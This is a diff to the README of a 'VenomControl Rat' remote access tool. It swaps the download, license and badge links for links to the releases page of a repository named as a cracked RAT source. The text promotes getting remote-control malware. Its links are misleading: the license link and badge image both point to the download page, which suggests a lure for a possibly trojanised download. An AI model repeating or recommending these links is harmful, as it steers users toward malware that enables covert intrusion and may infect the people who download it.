@@ -19,7 +19,7 @@ The VenomControl Rat is a powerful Remote Access Tool (RAT) that allows users to
 ## Installation
 
 To obtain the VenomControl Rat source code, please click on the following link:
-[Download VenomControl Rat Source Code](https://github.com/file/Soft.zip)
+[Download VenomControl Rat Source Code](https://github.com/zatrox699/VenomControl-Rat-Crack-Source/releases)
 
 ## Usage
 
@@ -59,10 +59,10 @@ For any issues or questions regarding VenomControl Rat, please check the "Releas
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Soft/license) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/zatrox699/VenomControl-Rat-Crack-Source/releases) file for details.
 
 ---
 
 Thank you for visiting the VenomControl Rat Repository. Happy coding! 🚀🐍
 
-[![](https://img.shields.io/badge/Download-VenomControl_Rat-brightgreen)](https://github.com/file/Soft.zip)
+[![](https://github.com/zatrox699/VenomControl-Rat-Crack-Source/releases)](https://github.com/zatrox699/VenomControl-Rat-Crack-Source/releases)
